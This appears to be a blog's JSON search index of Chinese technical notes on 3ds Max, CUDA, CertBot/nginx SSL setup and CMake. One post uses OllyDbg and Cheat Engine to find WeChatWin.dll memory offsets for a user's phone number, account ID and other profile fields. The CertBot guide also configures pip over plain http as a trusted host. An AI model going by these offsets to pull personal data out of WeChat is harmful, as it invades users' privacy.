线程并发：在同一进程中维护多个线程池，由内核在线程池间切换；优点是兼顾编程容易度和性能，共享数据方便；缺点是需要引入同步机制避免修改读取共享变量潜在的冲突，性能好于进程但弱于I&#x2F;O多路复用： 并发挑战：线程安全、可重入性、第三方函数、竞争、死锁；","categories":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}],"tags":[{"name":"计算机","slug":"计算机","permalink":"http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"}]},{"title":"3DMax","slug":"3DMax","date":"2019-08-21T08:26:00.000Z","updated":"2024-09-22T03:45:37.410Z","comments":true,"path":"2019/08/21/3DMax/","permalink":"http://example.com/2019/08/21/3DMax/","excerpt":"","text":"建模基础 建模思路 几何体 通过捕捉开关可以很好的实现对齐； 通过在多个视图间切换，可以准确的操作物体的位置； “选择并旋转”按钮，可以用来压扁或拉长几何体，例如压扁一个球； 一些快捷键 鼠标中键：手形移动画面； 鼠标滚动：放大缩小画面； Alt + 鼠标滚动：大尺度的放大缩小画面； Shift + 拖动：复制； Ctrl + V：原位置复制 之后可以右键点击“移动”图标，来确切控制X&#x2F;Y&#x2F;Z 轴的移动距离； 视图快速切换：B 底视图，F 前视图，L 左视图，T 顶视图；P 透视图； 样条线 曲线的绘制：先画出多个角点的直线，然后转成 Bezier 曲线，然后调整弯曲程度，让其变得平滑； 线条的径向渲染可使其出现类似电缆的圆线的效果； 线条的矩形渲染可使其出现类似几体体的效果； 文字通过增加“挤出”修改器，可使其出现几体体的效果； 两条样本线合并成一个整体 右键单击其中一条样条线，转换为可编辑样条线，然后在“几何体”的下拉样中点击“附加”按纽，再选择视图中的另外一条样条线，就可以实现两条样本线变成一体； 绘制一条线后，可先点击“参数”-“选择”下拉栏-“顶点”，然后在“几何体”下拉栏中点击“优化”按钮，之后就可以在线段上添加任意多个顶点； 另外通过“参数”-“选择”下拉栏-“样条线”，配合“轮廓”按钮，可以实现物体的厚度； 修改器：修改器可以很方便的用来创建各种特殊形状的模型； 挤出修改器：用来将高度添加到二维图形中，并且将对象参数化； 车削修改器：通过围绕坐标轴旋转一个图片来创建一个对象，例如花瓶； 弯曲修改器：使物体在任意3个轴上控制弯曲的角度和方向； 噪波修改器：使对象表面的顶点进行随机变动，从而让表面变得起伏不规则； 平滑类修改器：用来平滑几何体； 扭曲修改器：与弯曲有点像，但是用来产生扭曲效果，例如扭抹布，而非弯曲效果； 扫描修改器：用于沿着基本样条线的路径，挤出横截面，类似“放样”复合对象，但这种方法更有效；例如制作管道法兰； 复合对象 布尔运算：对两个物体的并集、交集、差集等计算，以得到新的物体； 放样：将一个二维图形作为沿某个路径的剖面，从而生成复杂的三维对象；跟扫描修改器的功能有点像； 构图 构图比例 横向构图常用比例：4:3, 16:9, 16:10，也可以根据表现的重点自定义比例； 纵向构图：适用于表现高度较高或纵深较大的空间；没有固定的输出比例，根据画面的表现重点自由设定输出比例； 近焦与远焦：利用景深效果突出效果图要表达的主体，降低次要陪衬部分； 近焦构图：画面的焦点在近处的主体对象上，超出目标物体一定范围的对象会被虚化； 远焦构图：画面的焦点在远处的对象上，近处的对象会被虚化； 长焦与短焦：长短焦决定了画面透视的强弱；透视强时，可以展现更多的画面内容；透视弱时展现的内容减少，但主体更明确 长焦构图：透视弱，画面有构成感，适用于展示场景的主体对象； 短焦构图：短焦即广角，用于展示大空间场景，可以在画面中展示尽量多的内容；但也不适宜过度，否则会在画面四周产生形变； 全景构图：将场景的360度完全展示在画面中，可以用来制作三维的 VR 视觉世界； 摄影机 胶片规格：用来控制摄影机的景象范围，值越大，看到的景象就越多； 焦距：控制视野范围，值越大，视野越小，透视越弱； 光圈数：用来控制渲染的亮度；值越小，图像越亮；值越大，图像越暗； 光圈与景深有关联，大光圈的景深小；小光圈的景深大； 白平衡：用来控制图像的色偏； 胶片速度 ISO：用来控制图像的亮暗，值越大，表示 ISO 的感光系数越强，图像也越亮；白天适合使用较小的 ISO，晚上适用较大的 ISO； 散景特效：即“甜甜圈”效果，用来制作景深效果，使光源产生光斑； 灯光 光影常识 明暗对比：将图片灰度化后，最容易看出明暗对比的关系； 冷暖对比 自然界的天光是蓝色或深蓝色的冷色光源；人造光源则大多是黄色或橙色的暖色光源； 当室内开窗较大时，以室外光为主；当室内开窗较小时，以室内光为主； 虚实对比：光源照射物体后，所形成的阴影边缘的明显程度 光源本身越小，所形成的阴影边缘就越锐利； 光源本身越大，所形成的阴影边缘就越模糊； 光源的层次：光源强度的层次和空间感的层次（空间的纵深）； 效果图的常用灯光： 目标灯光 目标平行光 目标聚光灯 材质 材质的反射 表面反射：反射强烈的材质，光线从物体的表面反射出来，例如金属； 次表面反射：反射不强烈的材质，光线从物体的内层反射出来，例如玉石； 镜面反射：当反射面比较光滑时，例如镜面不锈钢、金属、大理石和玻璃等，平行入射光线会向某个方向平行的反射出去； 菲涅耳反射：反射强度与视点角度之间有关系；当视线垂直于反射物体表面时，反射最弱；视线与反射物体表面越接近平行，即夹角越小，反射越强烈，例如离湖边越近的地方，反射越弱；越远的地方，反射越强烈； 材质的折射：光线穿过物体后产生的光线，光线的方向会改变，颜色会改变，还会在周边环境中产生光斑； 材质的凹凸：软件使用凹凸属性来描述物体表面起伏不大却复杂的纹理；为了表现这种纹理感，经常使用漫反射贴图和凹凸贴图来进行处理； 常用贴图 常见类别 位图贴图：它使用预存的素材作为贴图，同时允许进行部分修改；包括可以平铺效果、偏移、模糊程度、裁剪等； 噪波贴图：可以用来实现物体的凹凸效果； 源：对象XYZ 选项，表示使用对象的 X&#x2F;Y&#x2F;Z 坐标来生成噪波球； 噪波类型 规则：生成普通噪波 分形：使用分形算法生成噪波（表面有一定的形状出现） 湍流：使用绝对值函数来制作故障线条的分形噪波；（表面有明显的线条+形状出现） 不透明度贴图：使用“黑透白不透”的规则，通过加载一张黑白图像来表示想要实现的透明度分布效果； 衰减贴图：用来控制材质从强烈到柔和的过渡效果； 混合贴图：用来制作材质之间的混合效果； 法线凹凸贴图：用来表现物体表面的起初凹凸效果； VRayHDRI 贴图：用来设置场景的环境贴图，即把它当作光源来使用； 平铺贴图：可以用来创建类似瓷砖的贴图； 贴图坐标 UVW贴图修改器：基本的贴图方法，有常用的各种贴图坐标转换； UVW展开修改器：将贴图坐标指定给对象和子对象，然后手动或使用工具来编辑坐标，用来实现更复杂的贴图效果，例如缝隙拐角等；","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"设计","slug":"设计","permalink":"http://example.com/tags/%E8%AE%BE%E8%AE%A1/"}]},{"title":"OD & CheatEngine","slug":"OD&CheatEngine","date":"2019-08-16T02:31:00.000Z","updated":"2024-09-22T03:47:02.143Z","comments":true,"path":"2019/08/16/OD&CheatEngine/","permalink":"http://example.com/2019/08/16/OD&CheatEngine/","excerpt":"","text":"OD 寻找基址 附加进程 文件-&gt;附加-&gt;选择要附加的进程 附加后是暂停的状态，之后点击“运行”按钮，可以开始运行； 计算头像的基址 通过 CE 获得 DLL 基址 5FF10000 后，再通过 OD 查到头像的地址 6117DBE4，然后二者相减后可以计算偏移值为 126DBE4； 使用方法 t 按钮可以查看所有进程 c 按钮可以回到主界面； b 按钮可以进入断点界面 在断点界面，可以使用空格键切换断点的启用与否； 在 command 的输入框中，可以通过 dd + 内存地址来定位，dc 和 du 功能一样，只是数据解析的格式不同，当显示中文字符时可能会用到； F2 快捷键可以用来在代码区中设置断点 CE 三个按钮，最左边的那个指打开一个进程，类似于 OD 里面的附加功能 打开进程后，标题栏会显示进程名称和内存地址； 通过 scan 按钮，可以搜索输入框中的值，支持多种格式，常用的是 String 格式； 如果要搜索微信窗口界面的内容，需要勾选 UTF-16，即眼睛看得到的；如果不勾选，则是搜索内存里面的内容，而不是界面上的内容； 搜索出来的结果中，如果地址是绿色的，则表示它是基址；黑色的则是动态的； 基址是通过模块地址加上偏移之后计算出来的； WeChatWin.dll+126D91C &#x3D; 6117D91C dll 的基址可以通过 6117D91C - 126D91C 反算得出；但更快的办法是在 CE 里面直接用按钮 Add Address Manully 打开窗口，然后输入 dll 名称即可获得，此处为 5FF10000 使用 Memory View 按钮可以打开浏览内存的窗口 使用 ctrl + G 可以跳转到指定的地址位置 通过跳转到指定位置，可以查看该地址附近的其他内容，因为有时候有些内容是相邻存储的； 其他信息 有些 wxid 如果是自动生成的，则可能会使用指针存储； 地址信息 DLL 基址：5FF10000 昵称偏移：WeChatWin.dll+126D91C 头像偏移：WeChatWin.dll+126DBE4 长度需要200才放得下 ID 偏移：WeChatWin.dll+126D8A4‬ 如果是自动生成的ID，该地址存的是指针，需要加个判断，根据情况取值； 手机偏移：WeChatWin.dll+126D950‬ 省份偏移：WeChatWin.dll+126DA08 城市偏移：WeChatWin.dll+126DA20 账号偏移：WeChatWin.dll + 126D938","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"逆向","slug":"逆向","permalink":"http://example.com/tags/%E9%80%86%E5%90%91/"}]},{"title":"CUDA","slug":"CUDA","date":"2019-05-27T09:38:00.000Z","updated":"2024-09-22T03:48:00.869Z","comments":true,"path":"2019/05/27/CUDA/","permalink":"http://example.com/2019/05/27/CUDA/","excerpt":"","text":"Tutorial 使用 global 可以将一个普通函数转换成 kernel 函数； 猜测此处的 global 可能是一个宏； 使用 cudaMallocManaged 函数，可以实现在 GPU 上分配内存 示例 float *x; cudaMallocManaged(&amp;x, N*sizeof(float)); 使用 cudaFree 可释放分配的 GPU 内存 cudaFree(x); 使用三个尖括号表示对 kernel 函数的调用 add&lt;&lt;&lt;1, 1&gt;&gt;&gt;(N, x, y); 它会创建一个 GPU 线程，来执行所调用的核函数； 由于 GPU 线程的执行，不会中断 CPU 线程，有点像是异步的； 因此如果 CPU 要使用 GPU 的计算结果，则需要显式的让 CPU 线程进行等待； 使用 cudaDeviceSynchronize() 函数，让 CPU 线程进入等待； 使用 GPU 加速的文件，后缀名需要更改为 .cu； 使用 nvcc 命令调用 CUDA C++ 编译器，对代码进行编译； 调用核函数所用的尖括号内部，原来是用来做并行计算的选项配置的； 尖括号中的第二个数字表示一个线程块中的线程数量；块的基本单位为32；因此块中的线程数量需要是32的倍数；（越高级的显卡，块中能够并行的线程数量越多，例如 P100 显卡可以达到2048个线程）； 对于 &lt;&lt;&lt;1, 256&gt;&gt;&gt; 它表示在1个线程周期中，使用 256个线程来做并行计算；但是，每个线程只会做一次计算；而不是把所有的计算分配到所有线程中； CUDA 可以让核函数获得线程在其所在块中的下标； threadIdx.x 存放线程在其所在块中的下标，假设命名为 index； blockDim.x 存放块中的线程数量，假设命名为 stride； 通过将循环条件设置为 for (int i &#x3D; index; i &lt; n; i +&#x3D; stride) ，将计算分配到每个线程中； 原理：GPU 有很多个处理器，组合成所谓的 SM（streaming Multiprocessors）流处理器；每个流处理器可以运行多个并行线程块；例如 P100显卡总共有56个流处理器，每个流处理器可以处理 2048 个线程（如果每个块按256个线程，算下来，貌似每个流处理器可以处理 64个块 block）；为了能够充分利用这些线程，对核函数的调用应该转换化多个线程块进行调用； 尖括号的第一个数字，表示线程块的数量；并行线程的块组成 grid；由于我们有 N 个元素需要处理，每个线程块有256个线程，我们只需要计算出计算 N 个元素所需要的块数量，即使用 N 除以块大小（如果 N 不能整除，需要小心）； int blockSize &#x3D; 256; int numBlocks &#x3D; (N + blockSize - 1) &#x2F; blockSize; add&lt;&lt;&lt;numBlocks, blockSize&gt;&gt;&gt;(N, x, y); blockIdx.x 存放块的下标； gridDim.x 存放总共的块数量； 今天重新看了官方的 CUDA 编程文档，发现 block 只是一种方便程序员的抽象；通过 block，让线程的组织看起来更符合某种规律，有时候会更加直观；但其实背后的本质仍然是通过计算指针的位置，来实现对目标位置的取值、计算和赋值； programming guide 介绍 GPU 原理：CPU 给控制单元和寄存器预留了很多空间，用来处理有很多控制条件类型的运算；GPU 是相反，它的控制单元和寄存器很小，但 ALU 计算单元很多，这特别适合用来计算控制条件少，但有大量相同类型计算任务的场景； CUDA 有三个重要的抽象：线程组合层级、共享内存、屏障同步；通过这些抽象机制，让开发者能够将应用程序中的单个计算任务拆解成多个并行计算的小任务的方式；只要运行环境可以获取到流处理器的数量，代码就可以根据环境变量，自动调整，以最大化利用多个流处理器进行并行计算； 编程模型 CUDA 通过将普通函数包装成核函数，将计算工作分发到不同的线程中并行处理，从而提高了计算速度； 普通函数包装成核函数后，使用 &lt;&lt;&lt;&gt;&gt;&gt; 两对尖括号进行调用，尖括号里面填写块数量和块线程数量两个参数；每个线程在其所有的块中，有一个下标；在包装普通函数时，需要将这个下标引入代码中，让代码中的数值计算，对应每个下标值（也即对应的线程）； &lt;&lt;&lt;&gt;&gt;&gt; 接受两种类型的参数，分别是 int 和 dim3 类型； 事实上，包装成核函数后，除了原来会传入的那些实参；默认还会传入另外几个参数，包括线程下标 ThreadIdx，块下标 blockIdx，块尺寸 blockDimx；这些信息可以用来改造原有的函数，使其计算工作匹配到单个线程中； 块可以有3种维度，分别可以用来对应三种场景的计算，分别是 vector, matrix, volume； 但实际上，单个块内部的线程数量由硬件决定的，因此是固定的；区别在于单个块内的这些线程，貌似会共享内存？答：是的，当形参是一个多维的时候，一次传入的实参值，刚好可以实现在一次计算中共同，不需要重复传入相同的实参； 块内部的线程，正常是并行进行的，每个线程之间没有顺序依赖关系；如果某个计算步骤有顺序的要求，需要所有线程将计算结果算出来后，才能继续向下进行，则此时可以通过 __syncthreads 函数来实现；它会让所有线程进入等待的状态，直到所有线程执行完毕，才会继续； 在 Cooperative Groups API 中，据说有更多的接口，可以用来实现线程同步的需求； 另外通过 shared memory 共享内存的接口，可以实现更快的性能； 内存层级 per-thread local memory：线程内部私有； per-block shared memory：块内共享，仅块内的线程可以访问； global memory：全局共享，所有块都能够访问； 异构编程 编程模型假设 GPU 部分的代码和 CPU 部分的代码是独立进行的，二者没有依赖关系；并假设它们拥有各自独立的 DRAM 动态内存； 通过 unified memory 模块，可以实现两种内存之间的桥梁； GPU 的版本号由 Major 和 Minor 两部分组成，其中的大版本号表示 GPU 的架构类型，而架构类型决定了 GPU 的计算能力；小版本号则用来表示 GPU 的局部更新； 编程接口 CUDA 对 C 语言的语法进行了小拓展，并提供了一个运行时库； 有一节专门讲所有的 C 语言语法拓展；当使用这些拓展时，需要使用专门的 nvcc 编辑器来编译源代码； 运行时库提供了一些函数，可以用来在 host 分配和释放内存，在 host 和 device 的内存之间转移数据，管理多个 device 等；完整功能在 CUDA 手册中有介绍； 运行时库是比 CUDA 驱动 API 的更高层次的封装，它可以让编程更容易，不用关心底层的驱动细节； CUDA 指令集称为 PTX；但一般通过 C 来编程会更直观； nvcc 工作流程 先将 device 源代码编译成 PTX 指令集的汇编格式，或者二进制 cubin 对象格式（它在执行期间还会进一步做 JIT 编译）； 将 host 代码中，标记有 &lt;&lt;&lt;&gt;&gt;&gt; 两个尖括号的地方，替换为运行时库函数，这些函数在执行时，会加载和调用第一步编译完成的 device 目标代码； 最后替换完成的源代码，交给 host 编译器完成剩下的编译工作； 引入 PTX 的机制，相当于增加了一层抽象，通过这层抽象，使得代码能够在多种不同规格和架构的 GPU 之间兼容，不会受到硬件实现细节的影响； 运行时库 通过 cudart 库实现，应用一般通过链接静态库 cudart.lib 或者 libcudart.a，或者 cudart.dll 或 libcudart.so 来调用； 模块介绍 device memory 用来管理 GPU 内存； shared memory 用来设置共享内存； Graphics Interoperability 提供了多个函数来与 OpenGL 和 Direct3D 进行交互； 初始化：没有显式的初始化函数，来做初始化的动作，而是当第一次执行 device code 的时候，才会触发初始化；初始化的时候，会为每个 GPU 设备生成一个上下文环境，这个环境可以被所有 host 的应用共享； 如果显式调用 cudaDeviceReset()函数，则会销毁这个环境，然后等到下一次调用 device code 的时候，才会再次初始化一个新环境； 显存 cudaMalloc 函数用来分配显存； cudaFree 用来释放显存； cudaMemcpy 用来在主存和显存之间传输数据； cudaMallocPitch 和 cudaMalloc3D 可用来分配二维和三维数组的显存，它们可以确保满足对齐要求； cudaMallocPitch 和 cudaMalloc3D 的参数格式有点奇怪，待查询下手册； cudaMemcpy2D 和 cudaMemcpy3D 则专用来复制内存中的二维和三维数据； cudaMemcpyToSymbol cudaMemcpyFromSymbol constant, device 用来访问全局变量； 共享内存 复制类对象到显存的方法，先在显存中声明一个新的类对象，值数据成员，直接手工进行赋值初始化；指针指向的数据成员，使用 cudaMalloc 加 cudaMemcpy 来实现拷贝 不知为何，写到这里，我重新看了一下代码，我感觉对象仍然是声明和存放在主存中的，只是对象的指针成员，指向了显存好像 对于改造后的 kernel 函数，它被各个 GPU 线程调用的时候，代码都是一模一样的，唯一的区别在于计算 index 的环境变量不同，因此它使得每个线程会根据下标去获取实参的不同部分进行计算； 对于矩阵乘法运算，由于其特殊的性质，可以将大矩阵分成小矩阵进行计算，然后再累加结果；当分解成多个小矩阵时，每个小矩阵由一个单块进行运算，可以实现共享内存 原理：GPU 有多个流处理器，每个流处理器都有自己的寄存器，这个寄存器的存储容易不大，但是它的读取速度很快，因此，如果能够将单个流处理器中，多个线程所需要用到的数据，都提前加载到各自的寄存器中，则可以减少对 GPU 显存的访问，大大提高了计算性能； 如何实现将数据加载到流处理器的寄存器，使得单个流处理器中的多个线程可以共享这些数据，从而不必要每个线程都对主显存发起访问？ 答：使用 shared 关键字来声明变量，由于每个线程只拷贝初始化一个变量值，因此需要再做一下线程同步，才能使得共享内存全部完成初始化，之后再进入下一步使用共享数据进行计算 硬件实施 使用 deviceQuery 可以查询当前机器上面的显卡信息，包括流处理器数量，每个SM 的最大线程数，每个 block 支持的最大线程数等 性能优化 附录 编译 nvcc 静态库编译步骤 nvcc -rdc&#x3D;true -c -o temp.o foo.cu 将 cu 文件编译成中间临时 object 文件 temp.o rdc 表示 relocatable device code，可重新定位的GPU代码的文件 -rdc&#x3D;true 表示生成的 GPU 代码文件不可执行，需要链接后才能执行；默认是 false ，表示直接生成可执行的GPU 代码文件； 怎么感觉这里跟 gcc 里面的 -fPIC 好像是一样的道理？ nvcc -dlink -o foo.o temp.o -lcudart -dlink 表示将不可执行的 rdc 文件链接到可执行的GPU代码文件中 感觉这个选项很像 gcc 里面的 -ldl，即 dynamic link； -lcudart 表示链接 cudart 库；这个库的完整名称为 cuda_runtime ar rc libfoo.a foo.o temp.o 将两个 object 文件合并成一个库文件 libfoo ranlib libfoo.a ranlib 表示更新静态库的符号表索引 g++ main.cpp -L. lfoo -o main -L&#x2F;usr&#x2F;local&#x2F;cuda&#x2F;lib64 -lcudart 编译主程序文件，需要分别链接静态库和动态库 编译选项 –cuda (-cuda) 用来将 cu 文件编译成 C&#x2F;C++ 格式的源文件，输出的文件可以被 host 的编译器进行处理； –device-c（-dc) 等同于原来 -rdc&#x3D;true 和 –compile 的效果叠加；即将 cu 文件单独编译成 .o 对象文件； –device-link(-dlink) 将有 rdc 代码的 obj 文件和 ptx, cubin、fatbin 文件链接成一个新的 obj 文件，这个文件含有可执行代码，可传递给 host 链接器； –library(-l) 指定要在链接阶段要使用的库名（库名无须写后缀） 库的搜索路径由另外一个选项 –library-path 进行指定 –library-path(-L) 指定要链接的库的搜索路径； –output-file (-o) 指定输出文件的名称 –lib(-lib) 将输入的文件，编译成 .o 文件；同时还可以将结果输出到指定的库文件中； 编译流程 步骤 源文件先进行预处理，然后编译成 CUDA 二进制机器码或者 PTX 中间码； 源文件再次预处理，将上一步的 fatbinary 嵌入进去；将 CUDA 专用的 C++ 扩展转换成标准 C++ 结构，变成合成码； 主机编译器将合成码转成主机对象文件； 编译样例 生成可执行文件 nvcc -arch&#x3D;sm_50 –device-c a.cu b.cu nvcc -arch&#x3D;sm_50 a.o b.o 注：-arch&#x3D;sm_50，在官方文档中有提示这个选项的作用会决定最终可执行代码内容） 生成静态库 nvcc -arch&#x3D;sm_50 -dc a.cu b.cu nvcc –lib a.o b.o -o test.a 官方文档提示 device linker 仅支持处理静态库； 编译问题 当 host 文件调用了 device 文件中代码时，host 文件在链接时，都需要加入 device 文件，不然会找不到所调用的代码，出现如下报错： undefined symbol __fatbinwrap_name (原来如此，终于找到原因了） 晕，当时忘了写下如何添加 device 文件了； 详见 test&#x2F;lib_test&#x2F;demo8 需要在 g++ 编译时写下需要链接的库名称，例如： LIBPATH &#x3D; &#x2F;usr&#x2F;local&#x2F;cuda&#x2F;lib64 g++ main.o -lgpu -L. -lcudadevrt -lcudart -L$(LIBPATH)","categories":[{"name":"工具","slug":"工具","permalink":"http://example.com/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"GPU","slug":"GPU","permalink":"http://example.com/tags/GPU/"}]},{"title":"使用 CertBot 自动更新 Let's Encrypt SSL 证书","slug":"使用 CertBot 自动更新 Let's Encrypt SSL 证书","date":"2019-05-26T04:28:06.000Z","updated":"2024-09-21T23:10:51.065Z","comments":true,"path":"2019/05/26/使用 CertBot 自动更新 Let's Encrypt SSL 证书/","permalink":"http://example.com/2019/05/26/%E4%BD%BF%E7%94%A8%20CertBot%20%E8%87%AA%E5%8A%A8%E6%9B%B4%E6%96%B0%20Let's%20Encrypt%20SSL%20%E8%AF%81%E4%B9%A6/","excerpt":"","text":"首次申请下载安装 CertBot1234# 下载 CertBot 脚本到当前目录，假设当前文件夹为 ~ 目录wget https://dl.eff.org/certbot-auto# 为 CertBot 脚本增加执行权限，# a 为 all 简写，x 为 execute 简写，a+x 表示所有用户及群组的可执行权限chmod a+x ./certbot-auto 配置 pip 国内源注：若之前已配置，请跳过此步骤；此步骤的目的是加速 CertBot 下载 python 模块的速度 12345678910# 新建 .pip 文件夹并进入mkdir .pip &amp;&amp; cd .pip# 创建 pip.conf 文件vi pip.conf# 在 pip.conf 文件中输入以下内容[global]index-url=http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com# 保存退出 运行脚本，安装依赖1./certbot-auto --help 配置 nginx目的：获取域名证书过程中， Let’s Encrypt 会对域名发起访问，以确认申请者对域名的所有权；故需要配置 nginx，以便能够对 Let’s Encrypt 的访问返回正确的响应； 1234# 创建文件夹，用于 Let&#x27;s Encrypt 访问时返回响应内容mkdir /home/letsencrypt# 打开 nginx 配置文件进行编辑，此处假设 nginx 的配置文件在以下路径：/usr/local/nginx/conf/nginx.conf，如不是，则相应修改路径vi /usr/local/nginx/conf/nginx.conf 1234567891011121314// 在 nginx 配置文件中，找到 http 下监听 80 端口的 serverhttp &#123; //...(略)... server &#123; listen 80; // 添加如下内容，此处假设申请域名为 www.helloworld.com，请修改为实际申请的域名 server_name www.helloworld.com; location ^~ /.well-known/acme-challenge/ &#123; defaulf_type &quot;text/plain&quot;; root /home/letsencrypt/; &#125; // ......以下略...... 重启 nginx1234567# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径# 先使用 -t 参数测试配置文件格式是否正确/usr/local/nginx/sbin/nginx -t# 若正确，屏幕上将显示以下字样&gt; nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok# 重启 Nginx/usr/local/nginx/sbin/nginx -s reload 运行脚本，申请证书在申请证书前，记得先将域名的 DNS 解析指向当前的服务器 IP，这样 letsencrypt 机构在向域名发起连接请求的时候，才能路由到当前设置的机器 1234# 此处为域名 www.helloworld.com 申请一张证书，其中的 youremail.com 请替换为你自己的邮箱地址./certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d www.helloworld.com# 如果要为多个子域名（如 api/test/www） 申请一张证书，则相应修改命令如下./certbot-auto certonly --email youremail.com --webroot -w /home/letsencrypt -d api.helloworld.com -d test.helloworld.com -d www.helloworld.com 申请成功后，界面下会有如下的成功提示： 12345IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/helloworld.com/fullchain.pem. Your cert will expire on 2019-08-26. To obtain a new version of the certificate in the future, simply run Let&#x27;s Encrypt again...... 配置 nginx，启用证书12345678910111213// 在 nginx 配置文件中，找到 http 下监听 443 端口的 serverhttp &#123; //...(略)... server &#123; listen 443 ssl; // 修改 server_name、ssl_certificate、ssl_certificate_key 三个字段的值 // 此处假设申请域名为 www.helloworld.com，请修改为实际申请的域名 server_name www.helloworld.com; ssl_certificate /etc/letsencrypt/live/www.helloworld.com/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/www.helloworld.com/privkey.pem; // ......以下略...... 当用户访问非加密的 80 端口时，如果需要让服务器自动跳转到 443 端口使用证书的 https 访问，则可以在 http 下 80 端口的 server 中增加如下内容： 1234567891011// 在 nginx 配置文件中，找到 http 下监听 80 端口的 serverhttp &#123; //...(略)... server &#123; listen 80; server_name www.helloworld.com; // 添加如下内容，实现自动跳转 return 301 https://$server_name$request_uri // ......以下略...... 重启 Nginx，让配置生效12# 此处假设 nginx 可执行文件在路径 /usr/local/nginx/sbin 下面，如不是则相应修改路径/usr/local/nginx/sbin/nginx -s reload 测试自动更新12# 使用 --dry-run 选项表示测试，非真正执行更新./certbot-auto renew --dry-run 若显示如下字样，则表示自动更新功能测试成功 1234Congratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/www.helloworld.com/fullchain.pem (success)** DRY RUN: simulating &#x27;certbot renew&#x27; close to cert expiry** (The test certificates above have not been saved.) 到期更新由于 Let’s Encrypt 颁发的证书只有 90 天有效期，因此需要定期进行证书更新 12# 手动更新./certbot-auto renew -v","categories":[{"name":"运维","slug":"运维","permalink":"http://example.com/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"服务器","slug":"服务器","permalink":"http://example.com/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"}]},{"title":"Cmake","slug":"Cmake","date":"2019-05-17T01:30:00.000Z","updated":"2024-09-22T03:49:33.551Z","comments":true,"path":"2019/05/17/Cmake/","permalink":"http://example.com/2019/05/17/Cmake/","excerpt":"","text":"缘起 由于 C 和 C++ 比较糟糕的库的链接设计的历史遗留问题，当编译源代码的时候，一般使用 Make 和 Makefile 来指定文件之间的依赖关系，这样可以带来两个好处：一是让编译工作尽量自动化，一条 Makefile 指令可以管一片；二是可以让编译工作加速，当只有少数几个文件中的代码出现变动时，则只需要编译与该代码有依赖或关联的部分文件即可，不需要将整个项目都重新编译，节省时间； 尽管已经有了 Make 这么好用的工具，仍然存在一个问题，即 Makefile 的编译工作跟操作系统有一定的依赖关系，即不同的操作系统，Makefile 的内容需要有所不同，才能正确编译代码；为了解决这个平台依赖的问题，引入了 CMake 工具，它的目标是只需写一次 CMakeLists，就可以根据所要编译的平台环境，自动生成对应的 Makefile，这样一来就可以极大的减少针对不同平台编写 Makefile 的工作量； CMake 有自己的语法，可以算是一种 DSL 了，按王垠说法，绝大部分 DSL 都设计的很糟糕，我也有同感，据说可能是因为它们都是由非 PL 专业的人员设计的，所以总是不如一门图灵完备的语言那么强大和高表达性； 后来，在 CMake 教程学完后，发现了另外一个以 python 作为作为语法表达的工具 SCons，估计这个工具就要强大多了，据说得到了很多名家的推荐，包括 Eric S. Raymond、Timothee Besset、Zed A. Shaw 等；有待日后抽空学习了解一下； 升级步骤 到官网下载源代码包，解压，进入解压后的文件夹 cmake . make make install （注：此步可选） 语法 说明 由指令+指令参数组成； 指令的名称一般使用小写字母表示（实际并不区分大小写），指令的参数部分一般用圆括号括起来，例如 cmake_minimum_required (VERSION 2.8) 参数部分中的变量名称一般使用大写字母表示，例如 VERSION，引用变量时的格式为美元符加花括号，例如 ${VERSION} 注释使用 # 符号；间隔使用空格 后来我发现 CMake 有很多自己的全局变量；包括 CMAKE_BINARY_DIR，顶级二进制文件目录 CMAKE_SOURCE_DIR，顶级源文件目录 CMAKE_CURRENT_BINARY_DIR，当前二进制文件目录 CMAKE_CURRENT_SOURCE_DIR，当前源文件目录 PROJECT_NAME，项目名称 具体指令 cmake_minimum_required 用来指定版本要求，例如：cmake_minimum_required (VERSION 2.8) project 用来指定项目名称，例如 project (Demo) add_executable 用来指定要生成的目标，以及目标所依赖的源文件，例如 add_executable(Demo main.cc) 其他源文件支持多个；当有很多时，可以使用变量来替换表示； aux_source_directory 用来查找指定目录下的所有源文件，首参数为目录路径，第二个参数是变量名，用来存储找到的结果； 例如 aux_source_directory(. DIR_SRCS) add_subdirectory 用来添加子目录，这样子目录下的 CMakeLists 也会进行处理； 子目录的 CMakeLists 用来处理子目录里面的内容，例如生成库文件； include_directories 指定头文件的搜索目录 link_directories 指定要链接的库文件的搜索目录 link_libraries 指定要链接的库文件的名称和路径（绝对地址） target_link_libraries 指定要链接的库文件的名称，第一个参数表示主文件，第二个参数表示主文件需要链接的库文件； 例如 target_link_libraries(Demo MathFunctions) 如果有多个库，估计也支持多参数，以及使用变量来表示多个库文件； add_library 用来指定要生成的库文件，第一个参数表示要生成的库文件，第二个参数所用到的源文件； 例如 add_library (MathFunctions ${DIR_LIB_SRCS}) 第二个参数也同样支持用变量表示多个文件； 格式 add_library( [STATIC | SHARED | MODULE] [EXCLUDE_FROM_ALL] [source1] [source2 …]) target_include_directories 指定编译 target 时要使用的 include 目录；其中的 target 需要由 add_library 或者 add_executable 指定； 格式 target_include_directories( [SYSTEM] [BEFORE] &lt;INTERFACE | PUBLIC | PRIVATE&gt; [items1…] [&lt;INTERFACE | PUBLIC | PRIVATE&gt; [items2…] …]) configure_file 根据输入的文件，替换其中的变量，生成另外一个文件；第一个参数表示输入的文件，第二个参数表示要生成的文件 输入文件中的变量定义格式为： #CMakedefine VAR … 输出文件中的变量会被替换为：#define VAR … 或者 &#x2F;* #undef VAR *&#x2F; （表示此变量被注释掉了，不启用） 例如： configure_file ( “${PROJECT_SOURCE_DIR}&#x2F;config.h.in” “${PROJECT_BINARY_DIR}&#x2F;config.h” ) 在输入的文件中，可以引用在 